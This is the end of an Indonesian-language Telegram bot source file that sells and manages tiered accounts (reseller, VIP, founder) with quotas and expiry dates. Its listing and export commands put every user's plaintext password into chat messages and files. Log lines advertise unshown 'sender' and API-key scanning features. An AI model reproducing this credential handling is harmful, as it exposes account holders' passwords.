  menuText += "📋 COMMAND YANG TERSEDIA:\n";
  if (role === 'founder') menuText += "- /addseller id,user,pass,durasi\n- /addowner id,user,pass,durasi\n- /addadmin id,user,pass,durasi\n- /addmod id,user,pass,durasi\n- /addha id,user,pass,durasi\n- /addfounder id,user,pass,durasi\n- /addvip id,user,pass,durasi\n- /addakun id,user,pass,durasi\n\n";
  else if (role === 'moderator') menuText += "- /addvip id,user,pass,durasi\n- /addakun id,user,pass,durasi\n- /addseller id,user,pass,durasi\n- /addha id,user,pass,durasi\n- /addadmin id,user,pass,durasi\n- /addown id,user,pass,durasi\n\n";
  else if (role === 'high admin') menuText += "- /addakun id,user,pass,durasi\n- /addseller id,user,pass,durasi\n- /addadmin id,user,pass,durasi\n- /addown id,user,pass,durasi\n\n";
  else if (role === 'admin') menuText += "- /addakun id,user,pass,durasi\n- /addseller id,user,pass,durasi\n- /addown id,user,pass,durasi\n\n";
  else if (role === 'owner') menuText += "- /addakun id,user,pass,durasi\n- /addseller id,user,pass,durasi\n\n";
  else if (role === 'reseller') menuText += "- /addakun id,user,pass,durasi\n\n";
  else if (role === 'vip') menuText += "- /addvip id,user,pass,durasi\n\n";
  else menuText += "- /addakun username,password,durasi\n\n";
  
  menuText += "📋 MENU UTAMA:\n- /start atau /menu - Menampilkan menu ini\n- /myakun - Lihat akun yang Anda buat\n- /cekkadaluarsa - Cek status expired akun";
  if (role === 'founder') menuText += "\n\n📋 MENU ADMIN:\n- /semuaakun - Lihat semua akun\n- /statakun - Statistik semua akun\n- /addsender - addsender\n- /backupdb - backup all database\n- /hapusakun username - Hapus akun";
  
  const photoUrl = "https://files.catbox.moe/v9pf3o.jpg";
  const keyboard = { reply_markup: { inline_keyboard: [[{ text: "📢 CHANNEL", url: "https://t.me/YakuzaXsilence" }, { text: "👑 OWNER", url: "https://t.me/RyyKiosy" }],
                                                      [{ text: "👨🏻‍💻 DEVELOPER", url: "https://t.me/RriztXflow" }]]} };    
  bot.sendPhoto(userId, photoUrl, { caption: menuText, parse_mode: "Markdown", ...keyboard });
});
*/
bot.onText(/^\/?(start|menu)$/, async (msg) => {
  if (msg.chat.type !== 'private') return bot.sendMessage(msg.chat.id, "❌ Silakan gunakan command ini di Private Chat dengan bot.");
  const userId = msg.from.id;
  const canAccess = await checkFollowRequirement(userId, userId, 'menggunakan bot');
  if (!canAccess) return;
  const { role, isAdmin, isMember } = await getUserRoleFromGroup(userId);
  userRoleCache.set(userId, { role, isAdmin, isMember, timestamp: Date.now() });
  if (!isMember) return bot.sendMessage(userId, "❌ Akses Ditolak!\n\nAnda harus menjadi anggota grup terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join ke grup kami terlebih dahulu.");
  const { allowed, remaining, maxAccounts } = canCreateAccount(userId, role);
  
  // Premium status berdasarkan role
  let premiumStatus = 'Free';
  if (role === 'founder' || role === 'moderator' || role === 'high admin') premiumStatus = 'Premium';
  else if (role === 'admin' || role === 'owner') premiumStatus = 'VIP';
  else if (role === 'reseller') premiumStatus = 'Reseller';
  else if (role === 'vip') premiumStatus = 'VIP+';
  
  const username = msg.from.username || msg.from.first_name || 'User';
  const sessionsSize = Math.floor(Math.random() * 100) + 50;
  
  let menuText = `<blockquote>─── 𝐘𝐀𝐊𝐔𝐙𝐀 𝐗 𝐒𝐈𝐋𝐄𝐍𝐂𝐄𝚵 ───</blockquote>\n`;
  menuText += `👋 Halo ${msg.from.first_name}!\n`;
  menuText += `<blockquote>〢「 𝐘𝐚𝐤𝐮𝐳𝐚 ☇ 𝐁𝐨𝐭 ° 𝐀𝐩𝐢 」</blockquote>\n`;
  menuText += ` ࿇ Author : —!OmhcSilence\n`;
  menuText += ` ࿇ Type : ( Case─Plugins )\n`;
  menuText += ` ࿇ League : Asia/Jakarta-\n`;
  menuText += ` ࿇ NameBot : YakuzaXSilence\n`;
  menuText += ` ࿇ Version : Pro \n`;
  menuText += ` ࿇ DataUser : ${username}!\n`;
  menuText += ` ࿇ Status : ${premiumStatus}\n`;
  menuText += ` ࿇ BotLogs : ${sessionsSize}\n`;
  menuText += `<blockquote>📊 Role: ${role.toUpperCase()}\n`;
  menuText += `📊 Status Grup: ${isAdmin ? 'Admin' : 'Member'}</blockquote>\n`;
  if (allowed) menuText += `<blockquote>✅ Sisa Kuota: ${remaining}/${maxAccounts}</blockquote>\n`;
  else menuText += `<blockquote>❌ Kuota Habis! Maksimal ${maxAccounts} akun.</blockquote>\n`;
  menuText += `<blockquote>📋 COMMAND YANG TERSEDIA:</blockquote>\n`;
  if (role === 'founder') menuText += "- /addseller id,user,pass,durasi\n- /addowner id,user,pass,durasi\n- /addadmin id,user,pass,durasi\n- /addmod id,user,pass,durasi\n- /addha id,user,pass,durasi\n- /addfounder id,user,pass,durasi\n- /addvip id,user,pass,durasi\n- /addakun id,user,pass,durasi\n\n";
  else if (role === 'moderator') menuText += "- /addvip id,user,pass,durasi\n- /addakun id,user,pass,durasi\n- /addseller id,user,pass,durasi\n- /addha id,user,pass,durasi\n- /addadmin id,user,pass,durasi\n- /addown id,user,pass,durasi\n\n";
  else if (role === 'high admin') menuText += "- /addakun id,user,pass,durasi\n- /addseller id,user,pass,durasi\n- /addadmin id,user,pass,durasi\n- /addown id,user,pass,durasi\n\n";
  else if (role === 'admin') menuText += "- /addakun id,user,pass,durasi\n- /addseller id,user,pass,durasi\n- /addown id,user,pass,durasi\n\n";
  else if (role === 'owner') menuText += "- /addakun id,user,pass,durasi\n- /addseller id,user,pass,durasi\n\n";
  else if (role === 'reseller') menuText += "- /addakun id,user,pass,durasi\n\n";
  else if (role === 'vip') menuText += "- /addvip id,user,pass,durasi\n\n";
  else menuText += "- /addakun username,password,durasi\n\n";
  menuText += "<blockquote>📋 MENU UTAMA:</blockquote>\n- /start atau /menu - Menampilkan menu ini\n- /myakun - Lihat akun yang Anda buat\n- /cekkadaluarsa - Cek status expired akun";
  if (role === 'founder') menuText += "\n\n📋 MENU ADMIN:\n- /semuaakun - Lihat semua akun\n- /statakun - Statistik semua akun\n- /addsender - addsender\n- /backupdb - backup all database\n- /hapusakun username - Hapus akun";
  menuText += `\n<blockquote>📢 Channel : <a href="https://t.me/YakuzaXsilence">YakuzaXsilence</a>\n👑 Owner : <a href="https://t.me/RyyKiosy">RyyKiosy</a>\n👨🏻‍💻 Developer : <a href="https://t.me/RriztXflow">RriztXflow</a></blockquote>`;
  
  const photoUrl = "https://j.top4top.io/p_3843d57a91.jpg";
  const keyboard = { reply_markup: { inline_keyboard: [[{ text: "📢 CHANNEL", url: "https://t.me/YakuzaXsilence" }, { text: "👑 OWNER", url: "https://t.me/RyyKiosy" }],
                                                      [{ text: "👨🏻‍💻 DEVELOPER", url: "https://t.me/RriztXflow" }]]} };    
  bot.sendPhoto(userId, photoUrl, { caption: menuText, parse_mode: "HTML", ...keyboard });
});

bot.setMyCommands([{ command: "start", description: "🚀 Start the bot" }, { command: "myakun", description: "💼 Cek akun" }]);

bot.onText(/^\/myakun$/, async (msg) => {
  const userId = msg.from.id;
  if (msg.chat.type !== 'private') return bot.sendMessage(msg.chat.id, "❌ Gunakan di Private Chat!");
  const canAccess = await checkFollowRequirement(userId, userId, 'melihat akun');
  if (!canAccess) return;
  const { isMember } = await getUserRoleFromGroup(userId);
  if (!isMember) return bot.sendMessage(userId, "❌ Anda bukan anggota grup!");
  const db = loadDatabase();
  const myAccounts = db.filter(acc => acc.createdBy === userId);
  if (myAccounts.length === 0) return bot.sendMessage(userId, "📭 Anda belum memiliki akun yang dibuat.");
  let accountList = `📋 AKUN YANG ANDA BUAT (${myAccounts.length}):\n\n`;
  myAccounts.forEach((acc, idx) => { accountList += `${idx+1}. 👤 ${acc.username} | 🎭 ${acc.role} | ⏳ Exp: ${acc.expiredDate}\n`; });
  bot.sendMessage(userId, accountList);
});

bot.onText(/^\/cekkadaluarsa$/, async (msg) => {
  const userId = msg.from.id;
  if (msg.chat.type !== 'private') return bot.sendMessage(msg.chat.id, "❌ Gunakan di Private Chat!");
  const canAccess = await checkFollowRequirement(userId, userId, 'cek expired');
  if (!canAccess) return;
  const { isMember } = await getUserRoleFromGroup(userId);
  if (!isMember) return bot.sendMessage(userId, "❌ Anda bukan anggota grup!");
  const db = loadDatabase();
  const myAccounts = db.filter(acc => acc.createdBy === userId);
  if (myAccounts.length === 0) return bot.sendMessage(userId, "📭 Anda belum memiliki akun.");
  let expiredList = "⏳ STATUS EXPIRED AKUN:\n\n";
  const today = new Date();
  myAccounts.forEach((acc, idx) => {
    const expiredDate = new Date(acc.expiredDate);
    const daysLeft = Math.ceil((expiredDate - today) / (1000 * 60 * 60 * 24));
    const status = daysLeft < 0 ? '❌ EXPIRED' : `✅ ${daysLeft} hari lagi`;
    expiredList += `${idx+1}. ${acc.username} (${acc.role}) | ${status}\n`;
  });
  bot.sendMessage(userId, expiredList);
});

bot.onText(/^\/statakun$/, async (msg) => {
  const userId = msg.from.id;
  if (msg.chat.type !== 'private') return bot.sendMessage(msg.chat.id, "❌ Gunakan di Private Chat!");
  const canAccess = await checkFollowRequirement(userId, userId, 'lihat statistik');
  if (!canAccess) return;
  const { role, isMember } = await getUserRoleFromGroup(userId);
  if (!isMember) return bot.sendMessage(userId, "❌ Anda bukan anggota grup!");
  if (!UNLIMITED_ROLES.includes(role)) return bot.sendMessage(userId, "❌ Fitur khusus untuk reseller/owner/high admin/moderator/founder!");
  const db = loadDatabase();
  if (db.length === 0) return bot.sendMessage(userId, "📭 Belum ada akun yang dibuat.");
  const roleStats = {}, creatorStats = {};
  db.forEach(acc => {
    roleStats[acc.role] = (roleStats[acc.role] || 0) + 1;
    const creator = acc.creatorName || 'Unknown';
    creatorStats[creator] = (creatorStats[creator] || 0) + 1;
  });
  let statsMessage = `📊 STATISTIK SEMUA AKUN\n\n📌 Total Akun: ${db.length}\n\n🎭 Berdasarkan Role:\n`;
  for (const [roleName, count] of Object.entries(roleStats)) statsMessage += `- ${roleName.toUpperCase()}: ${count} akun (${((count/db.length)*100).toFixed(1)}%)\n`;
  statsMessage += "\n👑 Berdasarkan Pembuat:\n";
  const sortedCreators = Object.entries(creatorStats).sort((a,b) => b[1] - a[1]);
  for (const [creator, count] of sortedCreators.slice(0,10)) statsMessage += `- ${creator}: ${count} akun\n`;
  statsMessage += "\n📌 Gunakan /semuaakun untuk melihat detail lengkap";
  bot.sendMessage(userId, statsMessage);
});

bot.onText(/^\/semuaakun(?:\s+(\d+))?$/, async (msg, match) => {
  const userId = msg.from.id;
  const page = match[1] ? parseInt(match[1]) : 1;
  const ITEMS_PER_PAGE = 15;
  if (msg.chat.type !== 'private') return bot.sendMessage(msg.chat.id, "❌ Gunakan di Private Chat!");
  const canAccess = await checkFollowRequirement(userId, userId, 'lihat semua akun');
  if (!canAccess) return;
  const { role, isMember } = await getUserRoleFromGroup(userId);
  if (!isMember) return bot.sendMessage(userId, "❌ Anda bukan anggota grup!");
  if (!UNLIMITED_ROLES.includes(role)) return bot.sendMessage(userId, "❌ Fitur khusus untuk reseller/owner/high admin/moderator/founder!");
  const db = loadDatabase();
  if (db.length === 0) return bot.sendMessage(userId, "📭 Belum ada akun yang dibuat.");
  if (db.length <= ITEMS_PER_PAGE) {
    let allList = `📊 SEMUA AKUN (${db.length} akun):\n\n`;
    db.forEach((acc, idx) => { allList += `${idx+1}. 👤 ${acc.username} | 🎭 ${acc.role} | ⏳ ${acc.expiredDate} | 👑 ${acc.creatorRole || 'unknown'} (${acc.creatorName || '-'})\n`; });
    if (allList.length > 4000) {
      const fileName = `semua_akun_${Date.now()}.txt`;
      const fileContent = `LAPORAN SEMUA AKUN\nTanggal: ${new Date().toLocaleString('id-ID')}\nTotal Akun: ${db.length}\n\n${allList}`;
      fs.writeFileSync(fileName, fileContent, 'utf8');
      await bot.sendDocument(userId, fileName, { caption: `📊 SEMUA AKUN\nTotal: ${db.length} akun\n📅 ${new Date().toLocaleString('id-ID')}` });
      fs.unlinkSync(fileName);
    } else await bot.sendMessage(userId, allList);
    return;
  }
  const totalPages = Math.ceil(db.length / ITEMS_PER_PAGE);
  if (page < 1 || page > totalPages) return bot.sendMessage(userId, `❌ Halaman tidak valid! Total halaman: ${totalPages}\nGunakan /semuaakun 1 untuk halaman pertama`);
  const startIdx = (page-1)*ITEMS_PER_PAGE;
  const endIdx = Math.min(startIdx+ITEMS_PER_PAGE, db.length);
  const pageAccounts = db.slice(startIdx, endIdx);
  let allList = `📊 SEMUA AKUN (${db.length} total)\n📄 Halaman ${page} dari ${totalPages}\n📋 Menampilkan akun ${startIdx+1}-${endIdx}\n\n`;
  pageAccounts.forEach((acc, idx) => {
    const globalIdx = startIdx+idx+1;
    allList += `${globalIdx}. 👤 ${acc.username}\n   🎭 Role: ${acc.role.toUpperCase()}\n   ⏳ Expired: ${acc.expiredDate}\n   👑 Creator: ${acc.creatorRole || 'unknown'} (${acc.creatorName || '-'})\n   📅 Dibuat: ${acc.createdAt ? acc.createdAt.split('T')[0] : '-'}\n   🔐 Pass: ${acc.password}\n   ━━━━━━━━━━━━━━━━━━━━\n`;
  });
  allList += `\n📌 Navigasi:\n`;
  if (page > 1) allList += `◀️ /semuaakun ${page-1} - Halaman sebelumnya\n`;
  if (page < totalPages) allList += `▶️ /semuaakun ${page+1} - Halaman selanjutnya\n`;
  allList += `📊 /statakun - Lihat statistik\n💾 Ketik export untuk download semua data sebagai file`;
  await bot.sendMessage(userId, allList);
});

bot.onText(/^\/hapusakun (.+)$/, async (msg, match) => {
  const userId = msg.from.id;
  if (msg.chat.type !== 'private') return bot.sendMessage(msg.chat.id, "❌ Gunakan di Private Chat!");
  const canAccess = await checkFollowRequirement(userId, userId, 'hapus akun');
  if (!canAccess) return;
  const { role, isMember } = await getUserRoleFromGroup(userId);
  if (!isMember) return bot.sendMessage(userId, "❌ Anda bukan anggota grup!");
  if (!UNLIMITED_ROLES.includes(role)) return bot.sendMessage(userId, "❌ Fitur khusus untuk reseller/owner/high admin/moderator/founder!");
  const username = match[1].trim();
  const db = loadDatabase();
  const index = db.findIndex(u => u.username === username);
  if (index === -1) return bot.sendMessage(userId, "❌ Username tidak ditemukan.");
  const deleted = db.splice(index,1)[0];
  saveDatabase(db);
  bot.sendMessage(userId, `🗑️ AKUN BERHASIL DIHAPUS!\n\nUsername: ${deleted.username}\nRole: ${deleted.role}\nDibuat oleh: ${deleted.creatorRole || 'unknown'} (${deleted.creatorName || '-'})`);
});

bot.onText(/^export$/, async (msg) => {
  const userId = msg.from.id;
  if (msg.chat.type !== 'private') return;
  const { role, isMember } = await getUserRoleFromGroup(userId);
  if (!isMember || !UNLIMITED_ROLES.includes(role)) return bot.sendMessage(userId, "❌ Anda tidak memiliki akses ke fitur ini!");
  const db = loadDatabase();
  if (db.length === 0) return bot.sendMessage(userId, "📭 Belum ada akun yang dibuat.");
  const fileName = `export_akun_${Date.now()}.txt`;
  let fileContent = `LAPORAN LENGKAP SEMUA AKUN\nTanggal Export: ${new Date().toLocaleString('id-ID')}\nTotal Akun: ${db.length}\n${'='.repeat(60)}\n\n`;
  db.forEach((acc, idx) => {
    fileContent += `${idx+1}. USERNAME: ${acc.username}\n   PASSWORD: ${acc.password}\n   ROLE: ${acc.role.toUpperCase()}\n   EXPIRED: ${acc.expiredDate}\n   CREATOR: ${acc.creatorRole || 'unknown'} (${acc.creatorName || '-'})\n   CREATOR ID: ${acc.createdBy || '-'}\n   DIBUAT: ${acc.createdAt ? acc.createdAt.split('T')[0] : '-'}\n${'-'.repeat(60)}\n`;
  });
  fs.writeFileSync(fileName, fileContent, 'utf8');
  await bot.sendDocument(userId, fileName, { caption: `📊 EXPORT DATA LENGKAP\nTotal: ${db.length} akun\n📅 ${new Date().toLocaleString('id-ID')}` });
  fs.unlinkSync(fileName);
});

async function startTelegramBot() {
  await initChannelIds();
  console.log("🤖 Telegram bot started");
  console.log("✅ Bot berjalan di Private Chat");
  console.log("📢 Wajib follow channel: " + REQUIRED_CHANNELS.map(c => c.username).join(', '));
  console.log("📋 Grup yang diizinkan: " + ALLOWED_GROUPS.length + " grup");
  console.log("📋 Member/VIP: maksimal 1 akun (format: /ckey user,pw,durasi)");
  console.log("🚀 Reseller/Owner/High Admin/Moderator/Founder: UNLIMITED (bisa custom role)");
  console.log("📁 Fitur SCAN VIP FOLDER: /cekglobal, /ceksender, /cekstats");
  console.log("🔥 Fitur GETSENDER AUTO SCAN: /getsender domain|plta|pltc");
  console.log("📊 Fitur lainnya: /statakun, pagination untuk /semuaakun");
}

module.exports = { bot, startTelegramBot };
